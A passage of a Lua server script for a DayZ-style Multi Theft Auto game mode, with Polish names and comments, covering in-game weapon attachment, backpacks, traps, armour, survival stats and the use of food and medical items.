			local update_dammo = getWeaponAmmoType(weap);
			if (getElementData(source, update_dammo) <= 0) then
				setElementData(source, "currentweapon_3", "");
			end
		else
			setElementData(source, "currentweapon_3", "");
		end
	end
end);

function equipThem(player, slot)
	removeWeaponBack(player);
	removeWeaponBack2(player);
	removeWeaponReplace(player);
	local bool = false
	for i = 1, 3 do
		local weapon = getElementData(player, "currentweapon_"..tostring(i));
		if weapon ~= "" and (getElementData(player, weapon.." \n") or 0) >= 1 then
			if (i == slot) then bool = true; else bool = false end
			local ammo,id,_ = getWeaponAmmoType(weapon);
			if (i == 3) then
				if getElementData(player, weapon.." \n") then
					giveWeapon(player, id, getElementData(player, weapon.." \n"), bool);
				end
			else
				if (id == 8) then
					giveWeapon(player, id, 1, bool);
				elseif id == 41 then
					giveWeapon(player, id, 999999999, bool);
				else
					local wam = getElementData(player, ammo) or 0;
					giveWeapon(player, id, wam, bool);
					setWeaponAmmo(player, id, wam);
				end
			end
		end
	end
	if (slot == 1) then
		local weap2 = getElementData(player, "currentweapon_2");
		if (weap2 ~= "") then
			local _,id,model2 = getWeaponAmmoType(weap2);
			if model2 then
				attachWeaponBack2(player, model2, id);
			end
		end
	elseif (slot == 2) then
		local weap1 = getElementData(player, "currentweapon_1");
		if (weap1 ~= "") then
			local _,_,model1 = getWeaponAmmoType(weap1);
			if model1 then
				attachWeaponBack(player, model1);
			end
		end
	else
		local weap1 = getElementData(player, "currentweapon_1");
		if (weap1 ~= "") then
			local _,_,model1 = getWeaponAmmoType(weap1);
			if model1 then
				attachWeaponBack(player, model1);
			end
		end
		local weap2 = getElementData(player, "currentweapon_2");
		if (weap2 ~= "") then
			local _,id,model2 = getWeaponAmmoType(weap2);
			if model2 then
				attachWeaponBack2(player, model2, id);
			end
		end
		if (slot == 0) then
			setPedWeaponSlot(player, 0);
		end
	end
end

function attachWeaponReplace(source, model)
	removeWeaponReplace(source);
	local x,y,z = getElementPosition(source);
	if (model > 1000) then
		elementWeaponRaplace[source] = createObject(model, x, y, z);
		setElementAlpha(elementWeaponRaplace[source],255)
		if elementWeaponRaplace[source] then
			setElementData(source, "tohide1", elementWeaponRaplace[source]);
		end
		if elementBackpack[source] then
			exports['bone_attach']:attachElementToBone(elementWeaponRaplace[source], source, 12, 0, 0, 0, 180, 90, 180);
		else
			exports['bone_attach']:attachElementToBone(elementWeaponRaplace[source], source, 12, 0, 0, 0, 180, 90, 180);
		end
	end
end

function attachWeaponBack(source, model)
if model==371 then return end
	removeWeaponBack(source);
	local x,y,z = getElementPosition(source);
	elementWeaponBack[source] = createObject(model, x, y, z);
	if elementWeaponBack[source] then
		setObjectScale(elementWeaponBack[source], 1);
		setElementData(source, "tohide3", elementWeaponBack[source]);
	end
	if elementBackpack[source] then
		-- exports['bone_attach']:attachElementToBone(elementWeaponBack[source], source, 3, 0.19, -0.31, -0.1, 0, 270, -90);
		exports['bone_attach']:attachElementToBone(elementWeaponBack[source], source, 3, 0.19, -0.14, 0.2, 180, 240, 0);
	else
		exports['bone_attach']:attachElementToBone(elementWeaponBack[source], source, 3, 0.19, -0.14, 0.2, 180, 240, 0);
	end
end

function attachWeaponBack2(source, model, id)
if model==371 then return end
	removeWeaponBack2(source);
	local x,y,z = getElementPosition(source);
	elementWeaponBack2[source] = createObject(model, x, y, z);
	if elementWeaponBack2[source] then
		setObjectScale(elementWeaponBack2[source], 1);
		if (id == 6) then
			setObjectScale(elementWeaponBack2[source], 0.7);
		elseif (id == 8) then
			setObjectScale(elementWeaponBack2[source], 0.8);
		end
		setElementData(source, "tohide4", elementWeaponBack2[source]);
	end
	if elementBackpack[source] then
		if (id == 8) then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.18, -0.12, 0.22, 180, 0, -90);
		elseif (id == 2 or id == 4 or id == 6 or id == 5) then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.18, -0.18, -0.1, 0, 0, -90);
		elseif id==9 then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.20, -0.11, -0.1, -0.1, 90, -11);
		else
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.18, -0.31, -0.1, 0, 270, -90);
		end
	else
		if (id == 8) then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.07 -0.14, -0.1, -0.1, 0, -8);
		elseif (id == 2 or id == 4) then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.20, -0.11, -0.1, -0.1, 0, -11);
		elseif (id == 6 or id == 5) then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.15, -0.11, -0.1, -0.1, 0, 70);
		elseif id==9 then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.20, -0.11, -0.1, -0.1, 90, -11);
		elseif id == 41 then
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.20, -0, -0.1, -0.1, 0, -11);
		else
			exports['bone_attach']:attachElementToBone(elementWeaponBack2[source], source, 3, -0.22, -0.11, -0.1, -0.1, -270, -11);
		end
	end
end

addEventHandler("onPlayerWeaponSwitch", root, function(previousWeaponID, currentWeaponID)
	local weapon = getElementData(source, "currentweapon_1");
	local weapon2 = getElementData(source, "currentweapon_2");
	if not weapon then return; end
	local _,weapID,model = getWeaponAmmoType(weapon);
	if (currentWeaponID == weapID) then
		removeWeaponBack(source);
		attachWeaponReplace(source, model);
	elseif (previousWeaponID == weapID) then
		removeWeaponReplace(source);
		if getElementAlpha(source) == 255 then
			attachWeaponBack(source, model);
		end
	end
	if not weapon2 then return; end
	local _,id2,model2 = getWeaponAmmoType(weapon2);
	if (previousWeaponID == id2) then
		if getElementAlpha(source) == 255 then
			attachWeaponBack2(source, model2, id2);
		end
	elseif (currentWeaponID == id2) then
		removeWeaponBack2(source);
	end
end);

addEventHandler("removeBackWeaponOnDrop", root, function(check, slot)
	if (slot == 1) then
		removeWeaponBack(source);
		removeWeaponReplace(source);
	elseif (slot == 2) then
		removeWeaponBack2(source);
	end
	if check then
		local weapon = getElementData(source, "currentweapon_"..tostring(slot));
		local _,id,_ = getWeaponAmmoType(weapon);
		takeWeapon(source, id);
		if (slot == 3) then
			takeWeapon(client, id);
			local weapon = getElementData(client, "currentweapon_3");
			if weapon then
				setElementData(client, weapon.." \n", getElementData(client, weapon.." \n") - 1);
				setElementData(client, "currentweapon_3", "");
			end
		end
		setElementData(source, "currentweapon_"..tostring(slot), "");
		triggerClientEvent(source, "refreshInventoryManual", source);
	end
end);

addEventHandler("onPlayerQuit", root, function()
	removeBackpack(source);
	removeWeaponBack(source);
	removeWeaponReplace(source);
	removeWeaponBack2(source);
end);

addEventHandler("onPlayerWasted", root, function()
	removeBackpack(source);
	--destroyKamizelkaWhenQuit(source)
	removeWeaponBack(source);
	removeWeaponReplace(source);
	removeWeaponBack2(source);
	if isElementFrozen(source) then
		toggleAllControls(source,true)
	end
end);


local trapy = {}
local trapy_timer = {}
local player_trap_to_col = {}


addEvent('onPlayerPutATrap',true)
addEventHandler('onPlayerPutATrap',root,function(itemName)
	if getElementData(source,itemName)==0 then return end
	local x,y,z = getElementPosition(source)
	local col = createColSphere(x,y,z-0.95,1.25)
	local object = createObject(1920,x,y,z-0.95)
	setElementData(source,itemName,(getElementData(source,itemName) or 0)-1)
	setPedAnimation(source,'BOMBER','BOM_Plant',-1,false,false,false,false)
	attachElements(object,col)
	trapy[col] = {true,object}
	trapy_timer[col] = setTimer(function(col)
		if isElement(col) then
			destroyElement(col)
			destroyElement(trapy[col][2])
		end
		trapy[col] = nil
	end,60000*15,1,col)
end)

addEventHandler('onColShapeHit',resourceRoot,function(hitElement)
	if hitElement and getElementType(hitElement)~='player' then return end
	if trapy[source] and trapy[source][1] then
		trapy[source][1] = false
		setElementModel(trapy[source][2],1918)
		if isTimer(trapy_timer[source]) then
			killTimer(trapy_timer[source])
		end
		setElementData(hitElement,'brokenbone',true)
		player_trap_to_col[hitElement] = source
		outputChatBox("Przytrzymaj spacje aby się uwolnic!",hitElement,0,200,0)
		setElementFrozen(hitElement,true)
		toggleAllControls(hitElement,false)
		trapy_timer[source] = setTimer(function(col)
			if isElement(col) then
				destroyElement(col)
				destroyElement(trapy[col][2])
			end
			trapy[col] = nil
		end,60000*2,1,source)
		triggerClientEvent(hitElement,'RingRender',resourceRoot)
	end
end)

addEvent('UwolnijSieFromTrap',true)
addEventHandler('UwolnijSieFromTrap',resourceRoot,function(player)
	if trapy[player_trap_to_col[player]] then
		if isTimer(trapy_timer[player_trap_to_col[player]]) then
			killTimer(trapy_timer[player_trap_to_col[player]])
		end
		if isElement(player_trap_to_col[player]) then
			destroyElement(player_trap_to_col[player])
			destroyElement(trapy[player_trap_to_col[player]][2])
		end
	end
	toggleAllControls(player,true)
	setElementFrozen(player,false)
end)


--[[setTimer(function()
for _,v in pairs(getElementsByType('player')) do
local source = v
local x,y,z = getElementPosition(source);
if getElementData(source,'logedin') then 
if not isPedInVehicle(v) then
--if getPlayerIdleTime(source)>=500 then return end
local newValue = (getElementData(source,'MAX_Slots') or 10);
			
			removeBackpack(source);
			if (newValue == 18) then elementBackpack[source] = createObject(3026, x, y, z); -- Assault Pack (ACU)
			elseif (newValue == 26) then elementBackpack[source] = createObject(1241, x, y, z-100); -- BAG
			elseif (newValue == 32) then elementBackpack[source] = createObject(1242, x, y, z-100); -- Alice Pack
			elseif (newValue == 42) then elementBackpack[source] = createObject(1243, x, y, z-100); -- Mountain Backpack
			elseif (newValue == 52) then elementBackpack[source] = createObject(1244, x, y, z-100); -- Czech Backpack
			elseif (newValue == 62) then elementBackpack[source] = createObject(1245, x, y, z-100); -- Tactical Backpack
			elseif (newValue == 72) then elementBackpack[source] = createObject(1246, x, y, z-100); -- Military Backpack
			elseif (newValue == 82) then elementBackpack[source] = createObject(1575, x, y, z-100); -- Coyote Backpack
			elseif (newValue >= 92) then elementBackpack[source] = createObject(1249, x, y, z-100); -- CMAR Backpack
			elseif (newValue == 8) then return; end
			if elementBackpack[source] then
				setElementCollisionsEnabled(elementBackpack[source],false)
				setElementData(source, "tohide2", elementBackpack[source]);
				if (newValue >= 82) then
					setObjectScale(elementBackpack[source], 0.95);
				end
			end
			if (newValue == 42) then
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05, 270, 0, 180);
			else
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
			if (newValue == 62) then
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05, 90, 0, 0);
			else
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
			if (newValue == 72) then
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05, 90, 0, 180);
			else
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
			if (newValue == 82) then
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05, 270, 0, 180);
			else
				attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
			end
end	
end
end,30000,0)]]

addEvent('GetFuckingRektBro',true)
addEventHandler("GetFuckingRektBro",resourceRoot,function(player)
	local x,y,z = getElementPosition(player);
	if getElementData(player,'logedin') then 
		if not isPedInVehicle(player) then
			local newValue = (getElementData(player, "MAX_Slots") or 8);
			removeBackpack(player);
			local x,y,z = getElementPosition(player);
			local realValue = newValue-0
		 	if (realValue == 14) then elementBackpack[player] = createObject(3026, x, y, z); -- Assault Pack (ACU)
			elseif (realValue == 20) then elementBackpack[player] = createObject(1241, x, y, z); -- Bag
			elseif (realValue == 32) then elementBackpack[player] = createObject(1242, x, y, z); -- Alice Pack
			elseif (realValue == 42) then elementBackpack[player] = createObject(1243, x, y, z); -- Mountain Backpack
			elseif (realValue == 52) then elementBackpack[player] = createObject(1244, x, y, z); -- Czech Backpack
			elseif (realValue == 62) then elementBackpack[player] = createObject(1575, x, y, z); -- Tactical Backpack
			elseif (realValue == 72) then elementBackpack[player] = createObject(1246, x, y, z); -- Military Backpack
			elseif (realValue == 82) then elementBackpack[player] = createObject(1575, x, y, z); -- Plecak Kojot
			elseif (realValue >= 92) then elementBackpack[player] = createObject(1249, x, y, z); -- CMAR Backpack
			elseif (realValue == 8) then return; end
			if elementBackpack[player] then
				setElementData(player, "tohide2", elementBackpack[player]);
				if (realValue >= 82) then
					setObjectScale(elementBackpack[player], 0.95);
				end
			end
			if (realValue == 42) then
				exports['bone_attach']:attachElementToBone(elementBackpack[player], player, 3, 0, -0.225, 0.05, 90, 0, 0);
			elseif (realValue == 72) then
				exports['bone_attach']:attachElementToBone(elementBackpack[player], player, 3, 0, -0.225,0, 90, 0, 0);
			elseif realValue==52 then
				exports['bone_attach']:attachElementToBone(elementBackpack[player], player, 3, 0, -0.16, 0.05, 270, 0, 180);
			elseif realValue==62 then
				exports['bone_attach']:attachElementToBone(elementBackpack[player], player, 3, 0, -0.16, 0.05,0,0, 0);
			else
				exports['bone_attach']:attachElementToBone(elementBackpack[player], player, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
		end
	end
end)



local kamizelki_table = {}
local helmy_table = {}


function nalozHelm(source,name)
	local x,y,z = getElementPosition(source);
	local id = nil
	local attach_dane = nil
	if name:find("Mossy") then
		id = 2049
		attach_dane = {-0.007,-0.11,-0.5,0,11,99}
	else
		id = 2050
		attach_dane = {0.01,-0.09,-0.59,-1,0,96}
	end
	helmy_table[source] = createObject(id, x, y, z);
	exports['bone_attach']:attachElementToBone(helmy_table[source], source,1,attach_dane[1],attach_dane[2],attach_dane[3],attach_dane[4],attach_dane[5],attach_dane[6]);
	setElementData(source,"Nalozony-Helm",helmy_table[source])
end

function nalozKamizelke(source,name)
	local x,y,z = getElementPosition(source);
	local id = nil
	local attach_dane = nil
	if name:find("Tactical") then
		id = 1997
		attach_dane = {-0.03,0.023,-0.515,-0.5,1,90}
	else
		id = 2012
		attach_dane = {0,0.01,-0.15,5,0,-180}
	end
	kamizelki_table[source] = createObject(id, x, y, z);
	setElementData(source,"Nalozona-Kamizelka",kamizelki_table[source])
	exports['bone_attach']:attachElementToBone(kamizelki_table[source], source,3,attach_dane[1],attach_dane[2],attach_dane[3],attach_dane[4],attach_dane[5],attach_dane[6]);
end



function refreshData(dataName, oldValue)
	if (getElementType(source) == "player") then
		if not oldValue then oldValue = 0; end
		if (dataName == "MAX_Slots") then
			local newValue = getElementData(source, dataName);
			removeBackpack(source);
			local x,y,z = getElementPosition(source);
			local realValue = newValue-0
		 	if (realValue == 14) then elementBackpack[source] = createObject(3026, x, y, z); -- Assault Pack (ACU)
			elseif (realValue == 20) then elementBackpack[source] = createObject(1241, x, y, z); -- Bag
			elseif (realValue == 32) then elementBackpack[source] = createObject(1242, x, y, z); -- Alice Pack
			elseif (realValue == 42) then elementBackpack[source] = createObject(1243, x, y, z); -- Mountain Backpack
			elseif (realValue == 52) then elementBackpack[source] = createObject(1244, x, y, z); -- Czech Backpack
			elseif (realValue == 62) then elementBackpack[source] = createObject(1575, x, y, z); -- Tactical Backpack
			elseif (realValue == 72) then elementBackpack[source] = createObject(1246, x, y, z); -- Military Backpack
			elseif (realValue == 82) then elementBackpack[source] = createObject(1575, x, y, z); -- Plecak Kojot
			elseif (realValue >= 92) then elementBackpack[source] = createObject(1246, x, y, z); -- CMAR Backpack
			elseif (realValue == 8) then return; end
			if elementBackpack[source] then
				setElementData(source, "tohide2", elementBackpack[source]);
				if (realValue >= 82) then
					setObjectScale(elementBackpack[source], 0.95);
				end
			end
			if (realValue == 42) then
				exports['bone_attach']:attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			elseif (realValue == 72) then
				exports['bone_attach']:attachElementToBone(elementBackpack[source], source, 3, 0, -0.225,0, 90, 0, 0);
			elseif realValue==52 then
				exports['bone_attach']:attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05, 270, 0, 180);
			elseif realValue==62 then
				exports['bone_attach']:attachElementToBone(elementBackpack[source], source, 3, 0, -0.16, 0.05,0,0, 0);
			else
				exports['bone_attach']:attachElementToBone(elementBackpack[source], source, 3, 0, -0.225, 0.05, 90, 0, 0);
			end
		elseif (dataName == "Map") then
			if (getElementData(source, "Map") >= 1) then
				toggleControl(source, "radar", true);
			else
				toggleControl(source, "radar", false);
			end
		--elseif dataName == "Custom_Slots" then
			--local chuj_starego = -(oldValue<0 and 0 or oldValue)
			--outputChatBox(chuj_starego)
			--setElementData(source,"MAX_Slots",)+)
			--setElementData(source,"MAX_Slots",getElementData(source,'MAX_Slots')+(getElementData(source, dataName) or 0))
			
		elseif (dataName == "GPS") then
			if (getElementData(source, "GPS") >= 1) then
				setPlayerHudComponentVisible(source, "radar", true);
			else
				setPlayerHudComponentVisible(source, "radar", false);
			end
		elseif (dataName == "Watch") then
			if (getElementData(source, "Watch") >= 1) then
				setPlayerHudComponentVisible(source, "clock", true);
			else
				setPlayerHudComponentVisible(source, "clock", false);
			end
		--[[elseif (dataName == "brokenbone") then
			if getElementData(source,'brokenbone') then
				triggerClientEvent(source,'BrokeLegSound',resourceRoot)
			end]]
		elseif dataName == "current_helm" then
			local newValue = getElementData(source, dataName);
			if isElement(helmy_table[source]) then
				destroyElement(helmy_table[source])
				helmy_table[source] = nil
			end
			if type(newValue) == "table" then
				nalozHelm(source,newValue[1])
			end
		elseif dataName == "current_kamizelka" then
			local newValue = getElementData(source, dataName);
			if isElement(kamizelki_table[source]) then
				destroyElement(kamizelki_table[source])
				kamizelki_table[source] = nil
			end
			if type(newValue) == "table" then
				nalozKamizelke(source,newValue[1])
			end
		elseif dataName == "current_tlumik" then
			local newValue = getElementData(source, dataName);
			if newValue then
				--local x,y,z = getElementPosition(source)
				--local object = createObject(2052,x,y,z)
				--exports['bone_attach']:attachElementToBone(object, source, 12, 0, 1, 0, 180, 90, 180);
				setPedStat(source,78,1000)
			else
				setPedStat(source,78,500)
			end
		elseif dataName == "currentweapon_1" then
			local data = getElementData(source, dataName);
			if data == "Barrett M107" then
				setPedStat(source,79,999)
			elseif data == "SVD Dragunov" then
				setPedStat(source,79,500)
			elseif data == "AA-12" then
				setPedStat(source,77,1000)
			else
				setPedStat(source,74,0)
				setPedStat(source,79,0)
			end
		end
		local weapon1 = getElementData(source, "currentweapon_1");
		local weapon2 = getElementData(source, "currentweapon_2");
		local newammo
		local weapon3 = getElementData(source, "currentweapon_3");
		if weapon3 == "Flara" then return end
		if (dataName == weapon1 or dataName == weapon2 or dataName == weapon3) then
			if (getElementData(source,dataName) and dataName:find(' \n')) then
				local ammoData,weapID = getWeaponAmmoType(dataName);
				takeWeapon(source, weapID);
			end
		end
		local ammoData1,weapID1 = getWeaponAmmoType(weapon1);
		if (dataName == ammoData1) then
			newammo = (oldValue-getElementData(source, dataName));
			
			if (newammo == 1) then
				if player_shoot[source] then player_shoot[source] = nil return end
				takeWeapon(source,weapID1,newammo)
				--setElementData(source,dataName,newammo)
				--giveWeapon(source,weapID1,newammo)
				return
			end
			if (getElementData(source, dataName) < oldValue) then
				takeWeapon(source, weapID1, newammo);
				removeWeaponBack(source);
			elseif (getElementData(source, dataName) > oldValue) then
				giveWeapon(source, weapID1, (getElementData(source, dataName)-oldValue), false);
			end
		end
		local ammoData2,weapID2 = getWeaponAmmoType(weapon2);
		if (dataName == ammoData2) then
			newammo = oldValue-getElementData(source, dataName);
			if (newammo == 1) then
				if player_shoot[source] then player_shoot[source] = nil return end
				takeWeapon(source,weapID2,newammo)
				--setElementData(source,dataName,newammo)
				--giveWeapon(source,weapID2,newammo)
				return
			end
			if (getElementData(source, dataName) < oldValue) then
				takeWeapon(source, weapID2, newammo);
			elseif (getElementData(source,dataName) > oldValue) then
				giveWeapon(source, weapID2, getElementData(source, dataName)-oldValue, false);
			end
		end
		local ammoData3,weapID3 = getWeaponAmmoType(weapon3);
		if (dataName == ammoData3) then
			newammo = oldValue-getElementData(source, dataName);
			if (newammo == 1) then
				if player_shoot[source] then player_shoot[source] = nil return end
				takeWeapon(source,weapID3,newammo)
				--giveWeapon(source,weapID3,newammo)
				return
			end
			if (getElementData(source, dataName) < oldValue) then
				takeWeapon(source, weapID3, newammo);
			elseif (getElementData(source, dataName) > oldValue) then
				giveWeapon(source, weapID3, getElementData(source, dataName)-oldValue, false);
			end
		end
	end
end
--[[
setTimer(function()
local x,y,z = getElementPosition(getRandomPlayer())
local object = createObject(2052,x,y,z)
exports['bone_attach']:attachElementToBone(object, getRandomPlayer(), 12, -0.13, 0, 0.5, 0, -5, 0);
end,50,1)]]

setTimer(function(v)
	for i,v in pairs(getElementsByType('player')) do
		addEventHandler('onElementDataChange',v,refreshData)
		if getElementData(v,"current_helm") and getElementData(v,"current_helm")[1] then
			nalozHelm(v,getElementData(v,"current_helm")[1])
		end
		if getElementData(v,"current_kamizelka") and getElementData(v,"current_kamizelka")[1] then
			nalozKamizelke(v,getElementData(v,"current_kamizelka")[1])
		end
	end
end,50,1,v)

addEventHandler('onPlayerJoin',root,function()
	addEventHandler('onElementDataChange',source,refreshData)
end)

addEventHandler('onPlayerQuit',root,function()
	removeEventHandler('onElementDataChange',source,refreshData)
	if kamizelki_table[source] then
		destroyElement(kamizelki_table[source])
		kamizelki_table[source] = nil
	end
	if helmy_table[source] then
		destroyElement(helmy_table[source])
		helmy_table[source] = nil
	end
	setElementData(source,"Nalozona-Kamizelka",nil)
	setElementData(source,"Nalozony-Helm",nil)
end)


--[[addEventHandler("onElementDataChange",root,function(dataName)
if (getElementType(source) ~= "player") then return end
if dataName~="Kamizelka Taktyczna \n" then return end
	destroyKamizelkaWhenQuit(source)
	attachKamizelkaWhenEq(source)
end)]]

addEventHandler('onPlayerQuit',root,function()
	--destroyKamizelkaWhenQuit(source)
end)

addEventHandler("onPlayerStealthKill", root, function(target)
	if (target and getElementType(target) == "player") then
		triggerEvent("kilLDayZPlayer",resourceRoot, target, source);
	end
end);

function addPlayerStats(player, data, value)
	if (data == "food") then
		local current = getElementData(player, data);
		if (current + value > 100) then
			setElementData(player, data, 100);
		elseif (current + value < 1) then
			setElementData(player, data, 0);
			setElementData(player, "blood", (getElementData(player, "blood") - math.random(50, 120)));
		else
			setElementData(player, data, (current + value));
		end
	elseif (data == "thirst") then
		local current = getElementData(player, data);
		if (current + value > 100) then
			setElementData(player, data, 100);
		elseif (current + value < 1) then
			setElementData(player, data, 0);
			setElementData(player, "blood", (getElementData(player, "blood") - math.random(50, 120)));
		else
			setElementData(player, data, (current + value));
		end
	elseif (data == "blood") then
		local current = getElementData(player, data);
		if getElementData(player,'Plec')=='WOMAN' then
			if (current + value > 12000) then
				setElementData(player,'blood',12000)
			elseif (current + value < 1) then
				setElementData(player, data, 0);
			else
				setElementData(player, data, (current + value));
			end
		else
			if (current + value > 13000) then
				setElementData(player,'blood',13000)
			elseif (current + value < 1) then
				setElementData(player, data, 0);
			else
				setElementData(player, data, (current + value));
			end
		end
	elseif (data == "temperature") then
		local current = getElementData(player, data);
		if (current + value > 41) then
			setElementData(player, data, 41);
		elseif (current + value <= 31) then
			setElementData(player, data, 31);
		else
			setElementData(player, data, (current + value));
		end
	elseif (data == "humanity") then
		local current = getElementData(player, data);
		local new = current + value;
		if (new > 5000) then
			setElementData(player, data, 5000);
			setElementData(player, "htype", "Hero");
		else
			setElementData(player, data, new);
			if (new <= 0) then
				setElementData(player, "htype", "Bandit");
			elseif new >= 2000 then
				setElementData(player, "htype", "Survivor");
			end
		end
	end
end


addEvent('ZabijajPoWoli',true)
addEventHandler('ZabijajPoWoli',resourceRoot,function(gracz)
		if getElementData(gracz, "logedin") then
			local value = 0
			if isElementInWater(gracz) then
				value = -0.01;
			end
			if getControlState(gracz, "sprint") then
				addPlayerStats(gracz, "thirst", -0.2);
			end
			if (getElementData(gracz, "humanity") < 2500) then
				addPlayerStats(gracz, "humanity", 30);
			end
			--
			if getElementData(gracz,"VIP") then
				addPlayerStats(gracz, "food", -0.5);
				addPlayerStats(gracz, "thirst", -0.5);
			else
				addPlayerStats(gracz, "food", -1.0);
				addPlayerStats(gracz, "thirst", -1.0);
			end
			local weather = getWeather();
			if (weather == 5) then
				value = (value + 0.005);
			elseif (weather == 8) then
				value = (value - 0.05);
			elseif (weather == 7) then
				value = (value - 0.01);
			elseif (weather == 10) then
				value = (value + 0.05);
			end
			addPlayerStats(gracz, "temperature", value);
		end 


end)




--[[setTimer(function()
	for _,v in ipairs(getElementsByType("player")) do
		if getElementData(v, "logedin") then
			local value = 0;
			if isElementInWater(v) then
				value = -0.01;
			end
			if getControlState(v, "sprint") then
				value = (value + 0.005);
				addPlayerStats(v, "thirst", -0.2);
			end
			local weather = getWeather();
			if (weather == 5) then
				value = (value + 0.005);
			elseif (weather == 8) then
				value = (value - 0.05);
			elseif (weather == 7) then
				value = (value - 0.01);
			elseif (weather == 10) then
				value = (value + 0.05);
			end
			if (getElementData(v, "humanity") < 2500) then
				addPlayerStats(v, "humanity", 30);
			end
			--addPlayerStats(v, "temperature", value);
			addPlayerStats(v, "food", -1.0);
			addPlayerStats(v, "thirst", -1.0);
		end 
	end
end, 60000, 0);]]

addEventHandler("onPlayerRequestChangingStats", root, function(itemName, itemInfo, data)
if getElementData(source,itemName)<=0 then return end

	if (data == "food") then
		if (itemName == "Burger") then blood = math.random(200, 300);
		elseif (itemName == "Pizza") then blood = math.random(300, 350);
		elseif (itemName == "Cooked Meat") then blood = math.random(600, 800);
		elseif (itemName == "Beans Can") then blood = math.random(150, 250);
		elseif (itemName == "Pasta Can") then blood = math.random(320, 400);
		elseif (itemName == "Kebab") then blood = math.random(600,800);
		end
		
		setPedAnimation(source, "FOOD", "EAT_Burger", -1, false, false, nil, false);
		setElementData(source, itemName, getElementData(source, itemName)-1);
		addPlayerStats(source, "blood", blood);
		addPlayerStats(source, data, math.random(60, 100));
	elseif (data == "thirst") then
	
	if (itemName == "Water Bottle") then
		--	setElementData(source, "Empty Water Bottle",(getElementData(source, "Empty Water Bottle") or 0) + 1);
		triggerClientEvent(source,'GetRektFromFerffa',source,'Empty Water Bottle')
	end
		setElementData(source, itemName, getElementData(source, itemName)-1);
		addPlayerStats(source, data, math.random(60, 100));
		setPedAnimation(source, "VENDING", "VEND_Drink2_P", -1, false, false, nil, false);
	end
	triggerClientEvent(source,'PlaySoundItem',source,itemName)
	local jezyk = getElementData(source,"Jezyk_Gry") or "PL"
	exports.DayZ_notification:DrawNotification(language[jezyk]['Zjadles']..itemName, 225, 255, 255, source);
	triggerClientEvent(source, "refreshInventoryManual", source);
end);
local medic_kits = {
['medic bag'] = {


},
['medic kit'] = {


},
}

addEventHandler("onPlayerUseMedicObject", root, function(itemName)
	if getElementData(source,itemName)<=0 then return end
	if (itemName == "Medic Bag") then
		if isTimer(medic_kits['medic bag'][source]) then return end
		if getElementData(source,itemName)<=0 then return end
		setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		setElementData(source, "pain", false);
		setElementData(source, "brokenbone", false)
		setElementData(source, "bleeding", 0);
		setElementData(source, itemName, getElementData(source, itemName) - 1);
		medic_kits['medic bag'][source] = setTimer(function(player)
		addPlayerStats(player, "blood", 12000);
		end,4000,3,source)
	elseif (itemName == "Medic Kit") then
		if getElementData(source,itemName)<=0 then return end
		if isTimer(medic_kits['medic kit'][source]) then return end
		setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
			setElementData(source, "pain", false);
			setElementData(source, "bleeding", 0);
			setElementData(source, "brokenbone", false)
			setElementData(source, itemName, getElementData(source, itemName) - 1);
		medic_kits['medic kit'][source] = setTimer(function(source)
		addPlayerStats(source, "blood", 6000);
		end,2000,1,source)
	elseif (itemName == "First Aid Kit") then
		if getElementData(source,itemName)<=0 then return end
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
			setElementData(source, "bleeding", 0);
			setElementData(source, "pain", false);
			setElementData(source, itemName, getElementData(source, itemName) - 1);
		addPlayerStats(source, "blood", 3000);
	end
	--setTimer(function(source)
		if (itemName == "Bandage") then
		if getElementData(source,itemName)<=0 then return end
			setElementData(source, "bleeding", 0);
			setElementData(source, itemName, getElementData(source, itemName) - 1);
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		elseif (itemName == "Heat Pack") then
		if getElementData(source,itemName)<=0 then return end
			setElementData(source, "cold", false);
			setElementData(source, "temperature", 37);
			setElementData(source, itemName, getElementData(source, itemName) - 1);
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		elseif (itemName == "Painkiller") then
		if getElementData(source,itemName)<=0 then return end
			setElementData(source, "pain", false);
			setElementData(source, itemName, getElementData(source, itemName) - 1);
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		elseif (itemName == "Morphine") then
		if getElementData(source,itemName)<=0 then return end
			setElementData(source, "brokenbone", false)
			setElementData(source, itemName, getElementData(source, itemName) - 1);
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		elseif (itemName == "Blood Bag") then
		if getElementData(source,itemName)<=0 then return end
			if getElementData(player,'Plec')=='WOMAN' then
				addPlayerStats(player, "blood", 12000);
			else
				addPlayerStats(player, "blood", 12000);
			end
			setElementData(source, itemName, getElementData(source, itemName) - 1);
			setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		end
		triggerClientEvent(source, "refreshInventoryManual", source);
	--end, 1000, 1, source);
	triggerClientEvent(source,'PlaySoundItem',source,itemName)
end);


local podniesienii = {}



setTimer(function()
	for i,v in pairs(podniesienii) do
		if getTickCount()>v then
			if isElement(i) then
